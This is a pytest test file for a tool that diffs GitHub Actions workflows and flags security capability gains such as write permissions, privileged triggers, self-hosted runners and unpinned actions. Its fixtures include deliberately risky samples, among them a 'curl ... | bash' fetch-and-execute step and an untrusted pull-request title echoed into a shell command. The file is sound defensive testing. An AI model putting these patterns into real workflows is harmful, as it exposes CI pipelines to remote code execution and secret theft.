"""Unit tests for the git diff inspector (security-capability deltas)."""

import os
import subprocess

import pytest

import inspect_git_diff as igd


def _git(args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True,
                   capture_output=True, text=True)


SECURE_WF = """\
name: CI
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: make
"""

RISKY_WF = """\
name: CI
on:
  push:
    branches: [main]
  pull_request_target:
permissions:
  contents: write
  id-token: write
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: evil/action@v1
      - run: make
"""


@pytest.fixture
def wf_repo(tmp_path):
    root = str(tmp_path)
    try:
        _git(["init", "-q"], root)
    except (OSError, subprocess.CalledProcessError):
        pytest.skip("git not available")
    _git(["config", "user.email", "t@example.com"], root)
    _git(["config", "user.name", "Test"], root)
    wf_dir = os.path.join(root, ".github", "workflows")
    os.makedirs(wf_dir)
    path = os.path.join(wf_dir, "ci.yml")
    with open(path, "w") as fh:
        fh.write(SECURE_WF)
    _git(["add", "-A"], root)
    _git(["commit", "-q", "-m", "initial"], root)
    return root, path


def test_no_changes_no_workflow_deltas(wf_repo):
    root, _ = wf_repo
    result = igd.inspect_diff(root)
    assert result["git"]["repository"] is True
    assert result["workflow_changes"] == []


def test_detects_capability_gains(wf_repo):
    root, path = wf_repo
    with open(path, "w") as fh:
        fh.write(RISKY_WF)  # modify working tree
    result = igd.inspect_diff(root)  # working tree vs HEAD
    assert ".github/workflows/ci.yml" in result["changed_files"]
    changes = result["workflow_changes"]
    assert len(changes) == 1
    delta = changes[0]["security_delta"]

    assert "id-token" in delta["permissions_gained"]
    assert delta["permissions_gained"]["contents"]["after"] == "write"
    assert "pull_request_target" in delta["new_privileged_triggers"]
    assert delta["new_self_hosted_runner"] is True
    assert "evil/action@v1" in delta["new_mutable_action_references"]
    assert delta["new_untrusted_checkout_refs"] == [
        "${{ github.event.pull_request.head.sha }}"
    ]


def test_before_after_snapshots(wf_repo):
    root, path = wf_repo
    with open(path, "w") as fh:
        fh.write(RISKY_WF)
    result = igd.inspect_diff(root)
    change = result["workflow_changes"][0]
    assert change["before"]["permissions"] == {"contents": "read"}
    assert change["after"]["permissions"]["id-token"] == "write"
    assert "pull_request_target" in change["after"]["triggers"]


def test_not_a_git_repo(tmp_path):
    result = igd.inspect_diff(str(tmp_path))
    assert result["git"]["repository"] is False
    assert result["workflow_changes"] == []


# --------------------------------------------------------------------------- #
# expanded capability-delta coverage (Phase 2.1), driven through _diff_workflow
# --------------------------------------------------------------------------- #
import inspect_workflows as iw  # noqa: E402


def _wf(text):
    return iw.inspect_workflow_text(text, "ci.yml")


def test_job_level_permission_gain_detected():
    # Top level stays read-only; a job quietly gains id-token: write.
    before = _wf(
        "on: push\npermissions:\n  contents: read\n"
        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: make\n"
    )
    after = _wf(
        "on: push\npermissions:\n  contents: read\n"
        "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    permissions:\n      id-token: write\n"
        "    steps:\n      - run: make\n"
    )
    delta = igd._diff_workflow(before, after)
    assert delta["permissions_gained"]["id-token"]["after"] == "write"


def test_new_mutable_docker_reference_detected():
    before = _wf(
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: make\n"
    )
    after = _wf(
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - uses: docker://alpine:3.19\n"
    )
    delta = igd._diff_workflow(before, after)
    assert "docker://alpine:3.19" in delta["new_mutable_action_references"]


def test_digest_pinned_docker_is_not_mutable():
    digest = "sha256:" + "b" * 64
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                f"    steps:\n      - uses: docker://alpine@{digest}\n")
    delta = igd._diff_workflow(before, after)
    assert "new_mutable_action_references" not in delta
    assert f"docker://alpine@{digest}" in delta["new_action_references"]


def test_new_secrets_inherit_and_reusable_call():
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf(
        "on: push\njobs:\n"
        "  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: make\n"
        "  deploy:\n"
        "    uses: org/repo/.github/workflows/deploy.yml@main\n"
        "    secrets: inherit\n"
    )
    delta = igd._diff_workflow(before, after)
    assert "deploy" in delta["new_secrets_inherit_jobs"]
    assert "org/repo/.github/workflows/deploy.yml@main" in \
        delta["new_reusable_workflow_calls"]
    assert "org/repo/.github/workflows/deploy.yml@main" in \
        delta["new_unpinned_reusable_workflow_calls"]


def test_new_environment_and_cache():
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf(
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    environment: production\n"
        "    steps:\n      - uses: actions/cache@v4\n"
    )
    delta = igd._diff_workflow(before, after)
    assert delta["new_environments"] == ["production"]
    assert delta["new_cache_jobs"] == ["build"]


def test_new_fetch_execute_and_untrusted_input():
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf(
        "on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: curl -sSL https://x/i.sh | bash\n"
        "      - run: echo ${{ github.event.pull_request.title }}\n"
    )
    delta = igd._diff_workflow(before, after)
    assert delta["new_fetch_execute"]
    assert "github.event.pull_request.title" in \
        delta["new_untrusted_input_references"]


def test_branch_like_mutable_reference_separated_from_version_tag():
    # A new @main ref (branch-like) is called out as the riskier subset; a new
    # @v1 ref is mutable but version-shaped and stays out of the branch-like set.
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf(
        "on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: third-party/branchy@main\n"
        "      - uses: third-party/tagged@v1\n"
    )
    delta = igd._diff_workflow(before, after)
    assert set(delta["new_mutable_action_references"]) == {
        "third-party/branchy@main", "third-party/tagged@v1"}
    assert delta["new_branch_like_mutable_references"] == [
        "third-party/branchy@main"]


def test_no_branch_like_key_when_only_version_tags_added():
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: third-party/tagged@v1.2.3\n")
    delta = igd._diff_workflow(before, after)
    assert "third-party/tagged@v1.2.3" in delta["new_mutable_action_references"]
    assert "new_branch_like_mutable_references" not in delta


def test_new_runner_labels_and_artifact_publisher():
    before = _wf("on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                 "    steps:\n      - run: make\n")
    after = _wf(
        "on: push\njobs:\n  build:\n    runs-on: [self-hosted, gpu]\n"
        "    steps:\n      - uses: actions/upload-artifact@v4\n"
    )
    delta = igd._diff_workflow(before, after)
    assert "gpu" in delta["new_runner_labels"]
    assert delta["new_self_hosted_runner"] is True
    assert "actions/upload-artifact@v4" in delta["new_artifact_publishers"]


def test_nested_workflow_path_is_ignored(wf_repo):
    # A workflow outside the repo-root .github/workflows/ is not active CI and
    # must not be diffed as a live pipeline.
    root, _ = wf_repo
    nested = os.path.join(root, "examples", "proj", ".github", "workflows")
    os.makedirs(nested)
    with open(os.path.join(nested, "ci.yml"), "w") as fh:
        fh.write(RISKY_WF)
    result = igd.inspect_diff(root)
    paths = [c["path"] for c in result["workflow_changes"]]
    assert all(p.startswith(".github/workflows/") for p in paths)
    assert not any("examples/" in p for p in paths)


def test_parse_partial_surfaced_and_noted(wf_repo):
    root, path = wf_repo
    # Tabs for indentation force the parser into partial mode.
    with open(path, "w") as fh:
        fh.write("on: push\njobs:\n\tbuild:\n\t\truns-on: ubuntu-latest\n")
    result = igd.inspect_diff(root)
    change = result["workflow_changes"][0]
    assert change["parse_partial"] is True
    assert any("parse_partial" in n for n in result["notes"])
